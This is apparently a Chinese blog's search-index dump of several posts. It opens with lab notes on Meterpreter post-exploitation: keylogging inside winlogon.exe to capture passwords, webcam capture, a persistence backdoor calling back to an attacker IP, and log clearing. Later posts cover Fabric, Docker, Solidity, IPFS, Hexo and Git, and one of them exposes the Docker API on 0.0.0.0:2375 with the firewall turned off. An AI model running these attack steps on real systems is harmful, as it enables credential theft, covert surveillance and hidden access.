run post/windows/manage/enable_rdp 在目标机上右键属性远程桌面确实被打开了 在开启远程桌面会话之前，我们还需要使用“idletime”命令检查远程用户的空闲时长： idletime ，这一步不太懂？？ 然后怎么通过远程桌面用我们创建的用户登录目标主机？后面再来解答 键盘记录Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令： keyscan_start：开启键盘记录功能 keyscan_dump：显示捕捉到的键盘记录信息 keyscan_stop：停止键盘记录功能 在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录 进程迁移Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。 在下面的例子中，我们会将Meterpreter跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。 首先，我们需要使用： ps 命令查看目标设备中运行的进程： 我们可以使用： getpid 查看我们当前的进程id 使用： migrate 目标进程ID 命令来绑定目标进程id，这里绑定目标pid的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用 kill pid 命令关闭进程。或者使用自动迁移进程（run post/windows/manage/migrate）命令，系统会自动寻找合适的进程然后迁移 进程迁移绑定完成后，就可以开始捕获键盘数据了 运行键盘记录功能的命令 我在目标机上进行了按键操作为何不记录？？ 禁止目标主机使用键盘鼠标 禁止(允许)目标使用键盘： uictl disable (enable) keyboard 禁止(允许)目标使用鼠标： uictl disable (enable) mouse what？？ 用目标主机摄像头拍照 获取目标系统的摄像头列表：webcam_list •从指定的摄像头，拍摄照片：webcam_snap •从指定的摄像头，开启视频：webcam_stream 我这里没有摄像头就不演示了 使用扩展库使用 load -l 查看扩展库 生成持续性后门因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接，这样太麻烦了。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。 建立持续性后门有两种方法 通过启动项启动 通过服务启动 启动项启动 用这种方法的话，我们先生成一个后门工具 ，传送门 –&gt; 用msf生成一个后门木马 然后放到windows的启动目录中： 1C:\\Users\\$username$\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 服务启动 通过服务启动，我们可以运行命令 1run persistence -X -i 5 -p 8888 -r 192.168.43.226 注释反弹时间间隔是5s， 会自动连接192.168.43.226的4444端口，缺点是容易被杀毒软件查杀 然后它就在目标机新建了这个文件：C:\\Windows\\TEMP\\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动 在目标主机可以看到这样一个文件夹，是一个VBScript脚本 查看靶机的端口连接情况 netstat -an 可以看到靶机连着我们的8888端口 靶机进行重启后，查看端口状态确实是连着的，但是msf断了又得重新exploit，如何通过留的后门进入靶机而不是通过msf进行进入到靶机里面？ 清除事件日志完成攻击操作之后，千万别忘了“打扫战场”。我们的所有操作都会被记录在目标系统的日志文件之中，因此我们需要在完成攻击之后使用命令 clearev 命令来清除事件日志：","categories":[{"name":"WannaCry","slug":"WannaCry","permalink":"http://www.zzugo.ayxyj.cn/categories/WannaCry/"}],"tags":[{"name":"WannaCry","slug":"WannaCry","permalink":"http://www.zzugo.ayxyj.cn/tags/WannaCry/"}]},{"title":"Hyperledger Fabric - 01 - 安装并测试网络","slug":"fabric","date":"2020-11-25T02:31:23.000Z","updated":"2020-11-25T10:39:35.000Z","comments":true,"path":"2020/11/25/fabric/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/25/fabric/","excerpt":"","text":"Hyperledger Fabric 搭建并测试一、环境准备 系统工具 版本 备注 CentOS 7 Docker 18.09.4 参考：Centps7安装docker Docker-compose 1.25.0 参考下方 GO 1.13.4 参考：CentOS7下载Go 解压配置环境变量即可 123456#安装docker-compose#方式一：curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose#方式二：pip install -U docker-compose==1.23.2 二、安装fabric2.x 首先，自行下载fabric源码git clone，将下载的fabric包解压出来，进入到$&#123;HOME&#125;/fabric/scripts脚本目录进行安装 下载过程比较漫长，因为采用的是docker镜像容器进行安装，需要下载所需要的镜像，我这里面拉取了所有的镜像，很多暂时不用（2.x不支持kafka,zookeeper） 脚本执行结束后，可以看到相关镜像等其他信息，如果存在没有拉取完的镜像，就在执行一边。 通过docker查看拉取的镜像信息docker image ls -a 执行完如上图，另外在scripts目录下会多出来一个fabric-samples目录 三、启动test-network测试网络12cd /fabric-samples/test-networknetwork.sh up 如下图，表示启动成功，已启动一个orderer节点和两个peer节点。 可以查看本地启动的docker container 存在测试网络启动的oder和peer 12docker ps -a #查看启动的containerdocker container ls -a #查看启动的container 四、使用测试网络 创建channel，使用network.sh脚本创建来创建一个连接org1和org2组织并加入他们peer的通道，命令如下： 1./network.sh createChannel 如上图，创建成功（默认通道名为mychannel）。 也可以带上channel标签，命令如下（-c channelName）： 1./network.sh createChannel -c channel1 如果要在一个步骤中启动网络并创建频道，可以同时使用up和create channel模式： 1./network.sh up createChannel 在通道上启动链码。 使用network.sh创建通道之后，可以使用以下命令在通道上启动链码（默认使用go语言）： 1./network.sh deployCC 可以指定语言，加-l ，比如用java，命令如下： 1./network.sh deployCC -l java 如图，启动成功： 与网络互动 网络启动之后，可以使用peer cli客户端去操作网络，可以通过cli客户端去调用部署智能合约，更新通道，或者安装和部署新的智能合约。 首先确保操作目录为test-network目录。使用以下命令将二进制文件添加到cli路径： 1export PATH=$&#123;PWD&#125;/../bin:$&#123;PWD&#125;:$PATH 还需要设置FABRIC_CFG_PATH路径指向fabric-samples中的core.yaml文件，命令如下： 1export FABRIC_CFG_PATH=$PWD/../config/ 设置允许org1操作peer cli的环境变量： 123456# Environment variables for Org1export CORE_PEER_TLS_ENABLED=trueexport CORE_PEER_LOCALMSPID=&quot;Org1MSP&quot;export CORE_PEER_TLS_ROOTCERT_FILE=$&#123;PWD&#125;/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crtexport CORE_PEER_ADDRESS=localhost:7051export CORE_PEER_MSPCONFIGPATH=$&#123;PWD&#125;/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp 如上，CORE_PEER_TLS_ROOTCERT_FILE和CORE_PEER_MSPCONFIGPATH环境变量指向organizations文件夹中的org1的加密文件。 使用以下命令获取汽车资产列表： 1peer chaincode query -C mychannel -n fabcar -c &#x27;&#123;&quot;Args&quot;:[&quot;queryAllCars&quot;]&#125;&#x27; 五、关闭网络1./network.sh down 启动过程详解 ./network.sh为两个peer节点和一个order节点创建了证书和密钥，默认情况下，脚本会利用在organizations/cryptogen文件夹下的加密工具。 脚本利用configtxgen工具创建了系统的创世块，它使用configtx/configtx.yaml文件来创建创世块，并存储在system-genesis-block文件夹中。 当上述两步完成之后，./network.sh会启动网络，脚本利用在docker文件夹下的docker-compose-test-net.yaml文件创建peer和orderer节点。 如果使用了createChannel子命令，脚本还会运行script文件夹下的createChannel.sh脚本来创建所需要的channel，脚本会用peer命令来创建channel，加入两个组织。 如果运行了deployCC命令，脚本会在所有peers上运行script下的deployCC.sh脚本来安装fabcar chaincode，在chaincode的定义被提交到channel之后，peer命令会调用init函数来初始化chaincode，并将所需的数据放入chaincode中。 注：下图是fabric简化交易过程 六、标志并启动网络（ca为网络的标志）1./network.sh up -ca","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/"},{"name":"Hyperledger Fabric","slug":"BlockChain/Hyperledger-Fabric","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Hyperledger-Fabric/"}],"tags":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/tags/BlockChain/"},{"name":"Hyperledger Fabric","slug":"Hyperledger-Fabric","permalink":"http://www.zzugo.ayxyj.cn/tags/Hyperledger-Fabric/"}]},{"title":"Docker Registry - 搭建本地仓库并测试","slug":"docker_的私有registry","date":"2020-11-23T06:24:15.000Z","updated":"2020-11-24T03:24:25.000Z","comments":true,"path":"2020/11/23/docker_的私有registry/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/23/docker_%E7%9A%84%E7%A7%81%E6%9C%89registry/","excerpt":"","text":"搭建一个私有的docker registry找一台docker host，然后运行 1docker run -d -v /opt/registry:/var/lib/registry -p 5000:5000 --restart=always --name registry registry:2 docker registry 绑定了到本地的80端口。 接下来我们配置DNS server，假如我们这台运行registry的机器地址是192.168.99.100, 然后我们找到上次配置gitlab ci的那个dns container 执行 1docker exec -it dns-server &#x2F;bin&#x2F;sh 添加一条新的记录 1234&#x2F; # more &#x2F;etc&#x2F;dnsmasqhosts192.168.211.10 gitlab.example.com192.168.99.100 registry.example.com&#x2F; # 然后重启container 1docker restart dns-server 最后我们去gitlab-ci服务器，ping一下 12345678910[vagrant@gitlab-ci ~]$ ping registry.example.comPING registry.example.com (192.168.99.100) 56(84) bytes of data.64 bytes from registry.example.com (192.168.99.100): icmp_seq&#x3D;1 ttl&#x3D;63 time&#x3D;0.395 ms64 bytes from registry.example.com (192.168.99.100): icmp_seq&#x3D;2 ttl&#x3D;63 time&#x3D;0.537 ms64 bytes from registry.example.com (192.168.99.100): icmp_seq&#x3D;3 ttl&#x3D;63 time&#x3D;0.683 ms^C--- registry.example.com ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 2003msrtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.395&#x2F;0.538&#x2F;0.683&#x2F;0.119 ms[vagrant@gitlab-ci ~]$ 成功。 测试在gitlab-ci服务器上，编辑 创建一个文件 1sudo vim &#x2F;etc&#x2F;docker&#x2F;daemon.json 然后写入内容： 123[vagrant@gitlab-ci ~]$ sudo more &#x2F;etc&#x2F;docker&#x2F;daemon.json&#123; &quot;insecure-registries&quot;:[&quot;registry.example.com:5000&quot;] &#125;[vagrant@gitlab-ci ~]$ 从docker hub拉取一个busybox，然后打一个tag 12docker pull busyboxdocker tag busybox registry.example.com:5000&#x2F;busybox 然后push到我们的私有registry里 12345[vagrant@gitlab-ci ~]$ docker push registry.example.com:5000&#x2F;busyboxThe push refers to repository [registry.example.com:5000&#x2F;busybox]c5183829c43c: Pushedlatest: digest: sha256:c7b0a24019b0e6eda714ec0fa137ad42bc44a754d9cea17d14fba3a80ccc1ee4 size: 527[vagrant@gitlab-ci ~]$ 成功。","categories":[{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/"},{"name":"Registry","slug":"Docker/Registry","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/Registry/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/tags/Docker/"},{"name":"Registry","slug":"Registry","permalink":"http://www.zzugo.ayxyj.cn/tags/Registry/"}]},{"title":"Docker Portainer - 安装并远程连接docker-WebUI","slug":"docker-portainer","date":"2020-11-22T02:31:23.000Z","updated":"2020-11-24T03:20:24.000Z","comments":true,"path":"2020/11/22/docker-portainer/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/22/docker-portainer/","excerpt":"","text":"Centos7远程访问系统中的docker-WebUI工具Portainer首先获取portainer image 1docker pull portainer/portainer 新建一个卷（portainer_data）来存Portainer数据 12345docker volume create portainer_datadocker run -d -p 9000:9000 -p 8000:8000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer #第二种本地存储docker run -d --restart=always -p 9000:9000 -v /root/portainer:/data -v /var/run/docker.sock:/var/run/docker.sock --name dev-portainer portainer/portainer 修改将要被远程连接的客户机的docker.service 文件开通docker的远程管理： 12vim /lib/systemd/system/docker.serviceExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375 重启客户机docker 12systemctl daemon-reload systemctl restart docker 关闭客户机防火墙 1234567查看防火墙状态： systemctl status firewalld.service #绿的running表示防火墙开启执行关闭命令： systemctl stop firewalld.service再次执行查看防火墙命令：systemctl status firewalld.service执行开机禁用防火墙自启命令 ： systemctl disable firewalld.service 查看端口信息 12ss -ntpl#存在2375即可访问","categories":[{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/"},{"name":"Portainer","slug":"Docker/Portainer","permalink":"http://www.zzugo.ayxyj.cn/categories/Docker/Portainer/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.zzugo.ayxyj.cn/tags/Docker/"},{"name":"Portainer","slug":"Portainer","permalink":"http://www.zzugo.ayxyj.cn/tags/Portainer/"}]},{"title":"Solidity - 02 - 基本语法","slug":"solidity-02","date":"2020-11-18T04:36:42.000Z","updated":"2020-11-29T10:47:16.560Z","comments":true,"path":"2020/11/18/solidity-02/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/18/solidity-02/","excerpt":"","text":"元素的可见性private 修饰的函数为私有的，只有合约内部可以调用 Public修饰的函数为共有的，合约内外都可以调用 public/private 可以修饰状态变量 状态变量默认是私有的 123456789101112131415161718192021222324252627282930pragma solidity ^0.4.24;contract Test &#123; //状态变量 //类型不匹配时需要显示转换类型 //返回值需要使用returns描述 //public/private 可以修饰状态变量 //状态变量默认是私有的 uint256 public ui256 = 100; int8 private i10 = -10; //private 修饰的函数为私有的，只有合约内部可以调用 function add() private view returns(uint256) &#123; return ui256 + uint256(i10); &#125; function isEqueal() public view returns(bool) &#123; return ui256 == uint256(i10); &#125; //Public修饰的函数为共有的，合约内外都可以调用 function Add() public view returns(uint256)&#123; return add(); &#125;&#125; View，Constant，Pure介绍 ==//在constant/view 修饰函数的函数中，如果去修改了状态变量，编译器不会报错，但是赋值不会成功(坑！！！！）== 12345678910111213141516171819202122232425262728293031323334353637383940414243pragma solidity ^0.4.24;contract Test &#123; //状态变量 //类型不匹配时需要显示转换类型 //返回值需要使用returns描述 //public/private 可以修饰状态变量 //状态变量默认是私有的 uint256 public ui = 100; int8 private i10 = 10; // 1. 如果函数中没有用到状态变量：（既没有读也没有写），就修饰为pure // 2. 如果读了，但是没写，修饰为view、constant // 3. 如果写了，那么不修饰即可 function add() public constant returns(uint256) &#123; return ui + uint256(i10); &#125; function test() public pure returns(string) &#123; return &quot;hello&quot;; &#125; function setValue(uint256 num) public &#123; ui = num; &#125; //在constant/view 修饰函数的函数中，如果去修改了状态变量，编译器不会报错，但是赋值不会成功(坑！！！！） function setValue1(uint256 num) public constant &#123; ui = num; &#125; function isEqueal() public view returns(bool) &#123; return ui == uint256(i10); &#125;&#125; payable关键字1234567891011121314151617181920212223pragma solidity ^0.4.24;contract Test &#123; string public str ; //修饰为payable的函数才可以接收转账 //不指定payable无法接收 function test1(string src) public payable &#123; str = src; &#125; function test2(string src) public &#123; str = src; &#125; function getbalance() public view returns(uint256) &#123; //this代表当前合约本身 //balance方法，获取当前合约的余额 return this.balance; &#125;&#125; 地址获取余额balance123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.24;contract Test &#123; address public addr1 = 0x0014723a09acff6d2a60dcdf7aa4aff308fddc160c; //地址address类型本质上是一个160位的数字 //可以进行加减，需要强制转换 function add() public view returns(uint160) &#123; return uint160(addr1) + 10; &#125; //1. 匿名函数：没有函数名，没有参数，没有返回值的函数，就是匿名函数 //2. 当调用一个不存在的方法时，合约会默认的去调用匿名函数 //3. 匿名函数一般用来给合约转账，因为费用低 function () public payable &#123; &#125; function getBalance() public view returns(uint256) &#123; return addr1.balance; &#125; function getContractBalance() public view returns(uint256) &#123; //this代表当前合约本身 //balance方法，获取当前合约的余额 return address(this).balance; &#125; &#125; 地址转账12345678910111213141516171819202122232425262728293031323334353637383940pragma solidity ^0.4.24;contract Test &#123; address public addr0 = 0x00ca35b7d915458ef540ade6068dfe2f44e8fa733c; address public addr1 = 0x0014723a09acff6d2a60dcdf7aa4aff308fddc160c; //1. 匿名函数：没有函数名，没有参数，没有返回值的函数，就是匿名函数 //2. 当调用一个不存在的方法时，合约会默认的去调用匿名函数 //3. 匿名函数一般用来给合约转账，因为费用低 function () public payable &#123; &#125; function getBalance() public view returns(uint256) &#123; return addr1.balance; &#125; function getContractBalance() public view returns(uint256) &#123; return address(this).balance; &#125; //由合约向addr1 转账10以太币 function transfer() public &#123; //1. 转账的时候单位是wei //2. 1 ether = 10 ^18 wei （10的18次方） //3. 向谁转钱，就用谁调用tranfer函数 //4. 花费的是合约的钱 //5. 如果金额不足，transfer函数会抛出异常 addr1.transfer(10 * 10 **18); &#125; //send转账与tranfer使用方式一致，但是如果转账金额不足，不会抛出异常，而是会返回false function sendTest() public &#123; addr1.send(10 * 10 **18); &#125;&#125; bytes1：内置的固定长度的字节数组123456789101112131415161718192021222324pragma solidity ^0.4.24;contract Test &#123; bytes1 b1 =&quot;h&quot;; bytes20 b10 = &quot;helloworld&quot;; function getLen() public view returns(uint256) &#123; return b10.length; &#125; function setValue() private pure &#123; //1. 固定长度数组可以通过下标访问 //2. 只能读取，不能写 //b10[0] = v; &#125; //3. 存储的时候是ascii值存储 function getValue(uint256 i) public view returns(byte) &#123; return b10[i]; &#125;&#125; bytes动态字节数组 可以不分空间，直接进行字符串赋值，会自动分配空间 如果未分配过空间，使用下标访问会访问越界报错 可以设置长度，自动分配对应空间，并且初始化为0 可以通过下标进行数据修改 支持push操作，在bytes最后面追加元素 注意的坑： 旧版本的remix可以直接在remix中使用”helloworld”形式给bytes赋值，新版本不允许，必须使用0x格式 例如，如果函数类型为：byte b1, 那么赋值时需要输入的格式为： “h”（旧版本）, 0x68(新版本) 123456789101112131415161718192021222324252627282930313233343536373839pragma solidity ^0.4.24;contract Test &#123; bytes public name; function getLen() public view returns(uint256) &#123; return name.length; &#125; //1. 可以不分空间，直接进行字符串赋值，会自动分配空间 function setValue(bytes input) public &#123; name = input; &#125; //2. 如果未分配过空间，使用下标访问会访问越界报错 function getByIndex(uint256 i) public view returns(byte) &#123; return name[i]; &#125; //3. 可以设置长度，自动分配对应空间，并且初始化为0 function setLen(uint256 len) public &#123; name.length = len; &#125; //4.可以通过下标进行数据修改 function setValue2(uint256 i) public &#123; name[i] = &#x27;h&#x27;; &#125; //5. 支持push操作，在bytes最后面追加元素 function pushData() public &#123; name.push(&#x27;h&#x27;); &#125; &#125; string 动态尺寸的UTF-8编码字符串，是特殊的可变字节数组 引用类型 不支持下标索引 不支持length、push方法 可以修改(需通过bytes转换) 12345678910111213141516171819202122pragma solidity ^0.4.24;contract Test &#123; string public name = &quot;lily&quot;; function setName() public &#123; bytes(name)[0] = &quot;L&quot;; &#125; function getLength() public view returns(uint256) &#123; return bytes(name).length; &#125; function setLength(uint256 i) public &#123; bytes(name).length = i; bytes(name)[i - 1] = &#x27;H&#x27;; &#125; &#125; storageVsMemory关键字1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.4.24;contract Test &#123; string public name = &quot;lily&quot;; uint256 public num = 10; function call1() public &#123; setName(name); &#125; //对于引用类型数据，作为函数参数时，默认是memory类型（值传递） //function setName(string input) private &#123; function setName(string memory input) private &#123; num = 20; bytes(input)[0] = &quot;L&quot;; &#125; function call2() public &#123; setName2(name); &#125; //2. 如果想引用传递，那么需要明确指定为stroage类型 function setName2(string storage input) private &#123; num = 30; bytes(input)[0] = &quot;L&quot;; &#125; //如果局部变量是string，数组，结构体类型数据，默认情况下是storage类型 function localTest() public &#123; //string tmp = name; string storage tmp = name; num = 40; bytes(tmp)[0] = &quot;L&quot;; &#125; function localTest1() public &#123; //也可以明确设置为memory类型 string memory tmp = name; num = 50; bytes(tmp)[0] = &quot;L&quot;; &#125;&#125; byte1BytesString相互转换1234567891011121314151617181920212223242526272829303132333435363738pragma solidity ^0.4.24;contract Test &#123; bytes10 public b10 = 0x68656c6c6f776f726c64; //helloworld bytes public bs10 = new bytes(b10.length); //将固定长度数组的值赋值给不定长度数组 function fixedByteToBytes() public &#123; //bs10 = b10; for (uint256 i = 0; i &lt; b10.length; i++) &#123; bs10[i] = b10[i]; &#125; &#125; //将bytes转成string string public str1; function bytesToString() public &#123; fixedByteToBytes(); str1 = string(bs10); &#125; //将string转成bytes bytes public bs20; function stringToBytes() public &#123; bytesToString(); bs20 = bytes(str1); &#125;&#125; 自定义定长数组12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849pragma solidity ^0.4.24;contract Test &#123; //Type[Len] name uint256[10] public numbers = [1,2,3,4,5,6,7,8,9, 10]; uint256 public sum; // - 类型T，长度K的数组定义为T[K]，例如：uint [5] numbers, byte [10] names; // - 内容可变 // - 长度不可变，不支持push // - 支持length方法 function total() public returns(uint256) &#123; for (uint256 i = 0; i &lt; numbers.length; i++) &#123; sum += numbers[i]; &#125; return sum; &#125; function setLen() public &#123; //numbers.length = 10; &#125; function changeValue(uint256 i , uint256 value) public &#123; numbers[i] = value; &#125; //++++++++++++++++++++++++++++++++++ bytes10 public helloworldFixed = 0x68656c6c6f776f726c64; byte[10] public helloworldDynamic = [byte(0x68), 0x65, 0x6c, 0x6c, 0x6f, 0x77, 0x6f, 0x72, 0x6c, 0x64]; bytes public b10; function setToBytes() public returns (string)&#123; for (uint256 i=0; i&lt; helloworldDynamic.length; i++) &#123; byte b1 = helloworldDynamic[i]; b10.push(b1); &#125; return string(b10); &#125;&#125; 自定义不定长数组1234567891011121314151617181920212223242526272829303132333435363738pragma solidity ^0.4.24;contract Test &#123; //第一种创建方式，直接赋值 uint8[] numbers = [1,2,3,4,5,6,7,8,9,10]; function pushData(uint8 num) public &#123; numbers.push(num); &#125; function getNumbers() public view returns(uint8[]) &#123; return numbers; &#125; //使用new关键字进行创建，赋值给storage变量数组 uint8[] numbers2; function setNumbers2() public &#123; numbers2 = new uint8[](7); numbers2.length = 20; numbers2.push(10); &#125; function getNumbers2() public view returns(uint8[]) &#123; return numbers2; &#125; function setNumbers3() public &#123; //使用new创建的memory类型数组，无法改变长度 //uint8[] memory numbers3 = new uint8[](7); uint8[] memory numbers3; //numbers3.push(10); &#125;&#125; 结构体123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.24;//pragma experimental ABIEncoderV2;contract Test &#123; //定义结构之后无分号，与枚举一致 struct Student &#123; string name; uint age; uint score; string sex; &#125; Student[] public Students; //两种赋值方式 Student public stu1 = Student(&quot;lily&quot;, 18, 90, &quot;girl&quot;); Student public stu2 = Student(&#123;name:&quot;Jim&quot;, age:20, score:80, sex:&quot;boy&quot;&#125;); function assign() public &#123; Students.push(stu1); Students.push(stu2); stu1.name = &quot;Lily&quot;; &#125; // function returnStudent() public view returns(Student) &#123; // return stu1; // &#125; //使用圆括号包裹起来的类型叫做元组“tuple” //特性：1. 不可修改，2.可以容纳不同类型的数据 function returnStudent() public view returns(string, uint, uint, string) &#123; return (stu1.name, stu1.age, stu1.score, stu1.sex); &#125;&#125; mapping 相同的key对应的值会被覆盖 所有key都有值，不会抛异常，如果没有设置过某个key，会返回默认值 bool ： false int：0 string ： “” 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.4.20;contract Test &#123; //id -&gt; name mapping(uint =&gt; string) public id_names; //构造函数： //1. 对象在创建的时候，自动执行的函数，完成对象的初始化工作 //2. 构造函数仅执行一次 // function Test() public &#123; // &#125; constructor() public&#123; id_names[1] = &quot;lily&quot;; id_names[2] = &quot;Jim&quot;; id_names[3] = &quot;Lily&quot;; id_names[3] = &quot;Tom&quot;; &#125; function getNameById(uint id) public returns (string)&#123; //加上storage如何赋值？ string memory name = id_names[id]; return name; &#125; function setNameById(uint id) public returns (string)&#123; // mapping(uint =&gt; string) memory id_name = id_names; // var ids = id_names; id_names[id] = &quot;Hello&quot;; &#125; // function getMapLength() public returns (uint)&#123; // return id_names.length; // &#125; &#125;","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/"},{"name":"Solidity","slug":"BlockChain/Solidity","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Solidity/"}],"tags":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/tags/BlockChain/"},{"name":"Solidity","slug":"Solidity","permalink":"http://www.zzugo.ayxyj.cn/tags/Solidity/"}]},{"title":"IPFS - 01 - 搭建","slug":"IPFS","date":"2020-11-15T01:56:11.000Z","updated":"2020-11-15T10:15:08.745Z","comments":true,"path":"2020/11/15/IPFS/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/15/IPFS/","excerpt":"","text":"一、安装IPFS&gt; * 1.下载Centos或WIndows的安装包 2.上传并安装IPFS 3.解压并安装 12sh install.sh 二、测试IPFS123ipfs daemon #启动ipfs服务 加入IPFS网络ipfs 123456ipfs init ll -a ~/ //可以看到家目录下创建一个 .ipfs 文件夹ipfs cat /ipfs/QmQPeNsJPyVWPFDVHb77w8G42Fvo15z4bG2X8D2GhfbSXc/readme //可以看到IPFS几个模块 12ipfs id 可以通过快速开始学习IPFS的基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115[root@zzuxyj7 .ipfs]# ipfs cat /ipfs/QmQPeNsJPyVWPFDVHb77w8G42Fvo15z4bG2X8D2GhfbSXc/quick-start# 0.1 - Quick StartThis is a set of short examples with minimal explanation. It is meant asa &quot;quick start&quot;.Add a file to ipfs: echo &quot;hello world&quot; &gt;hello ipfs add helloView it: ipfs cat &lt;the-hash-you-got-here&gt;Try a directory: mkdir foo mkdir foo/bar echo &quot;baz&quot; &gt; foo/baz echo &quot;baz&quot; &gt; foo/bar/baz ipfs add -r fooView things: ipfs ls &lt;the-hash-here&gt; ipfs ls &lt;the-hash-here&gt;/bar ipfs cat &lt;the-hash-here&gt;/baz ipfs cat &lt;the-hash-here&gt;/bar/baz ipfs cat &lt;the-hash-here&gt;/bar ipfs ls &lt;the-hash-here&gt;/bazReferences: ipfs refs &lt;the-hash-here&gt; ipfs refs -r &lt;the-hash-here&gt; ipfs refs --helpGet: ipfs get &lt;the-hash-here&gt; -o foo2 diff foo foo2Objects: ipfs object get &lt;the-hash-here&gt; ipfs object get &lt;the-hash-here&gt;/foo2 ipfs object --helpPin + GC: ipfs pin add &lt;the-hash-here&gt; ipfs repo gc ipfs ls &lt;the-hash-here&gt; ipfs pin rm &lt;the-hash-here&gt; ipfs repo gcDaemon: ipfs daemon (in another terminal) ipfs idNetwork: (must be online) ipfs swarm peers ipfs id ipfs cat &lt;hash-of-remote-object&gt;Mount: (warning: fuse is finicky!) ipfs mount cd /ipfs/&lt;the-hash-here&gt; lsTool: ipfs version ipfs update ipfs commands ipfs config --help open http://localhost:5001/webuiBrowse: WebUI: http://localhost:5001/webui video: http://localhost:8080/ipfs/QmVc6zuAneKJzicnJpfrqCH9gSy6bz54JhcypfJYhGUFQu/play#/ipfs/QmTKZgRNwDNZwHtJSjCp6r5FYefzpULfy37JvMt9DwvXse images: http://localhost:8080/ipfs/QmZpc3HvfjEXvLWGQPWbHk3AjD5j8NEN4gmFN8Jmrd5g83/cs markdown renderer app: http://localhost:8080/ipfs/QmX7M9CiYXjVeFnkfVGf3y5ixTZ2ACeSGyL1vBJY1HvQPp/mdown","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/"},{"name":"IPFS","slug":"BlockChain/IPFS","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/IPFS/"}],"tags":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/tags/BlockChain/"},{"name":"IPFS","slug":"IPFS","permalink":"http://www.zzugo.ayxyj.cn/tags/IPFS/"}]},{"title":"Hexo_本地图片如何上传到Github","slug":"Hexo-本地图片-md","date":"2020-11-13T09:49:25.000Z","updated":"2020-11-13T11:02:00.121Z","comments":true,"path":"2020/11/13/Hexo-本地图片-md/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/13/Hexo-%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87-md/","excerpt":"","text":"第一步 首先进行配置文件的修改， _config.yml(不是主题配置文件)1post_asset_folder: true 第二步1npm install hexo-asset-image --save 第三步 通过命令，创建一篇新的文章时候，自动在source/_post/新建对应文件名称的文件夹（为了避免有时候文章中并没有图片，可以手动创建md文件，需要图片在创建文件夹即可）1hexo new test.md 进入source/_post/下即可看到对应创建的文件和文件夹第四步123hexo clean #清除hexo ge #生成静态资源 ， 此时可以通过输出信息看到对应的图片名称信息，基本就完成了hexo s #本地查看是否生效 注意 在md文件中，图片的路径可以写一下两种方式都可以load到图片的路径12![test1](./1.png)![test1](./test/2.png)","categories":[{"name":"Hexo","slug":"Hexo","permalink":"http://www.zzugo.ayxyj.cn/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://www.zzugo.ayxyj.cn/tags/Hexo/"}]},{"title":"Git基本用法","slug":"git","date":"2020-11-13T09:49:25.000Z","updated":"2020-11-15T11:10:19.000Z","comments":true,"path":"2020/11/13/git/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/13/git/","excerpt":"","text":"Git 入门 默认linux自带Git , 可以进行更新。 1yum install git -y #安装git 1git config 12345678910111213141516171819202122232425262728293031323334[root@zzuxyj7 ~]# git config 用法：git config [选项]配置文件位置 --global 使用全局配置文件 --system 使用系统级配置文件 --local 使用版本库级配置文件 -f, --file &lt;文件&gt; 使用指定的配置文件 --blob &lt;blob-id&gt; read config from given blob object操作 --get 获取值：name [value-regex] --get-all 获得所有的值：key [value-regex] --get-regexp 根据正则表达式获得值：name-regex [value-regex] 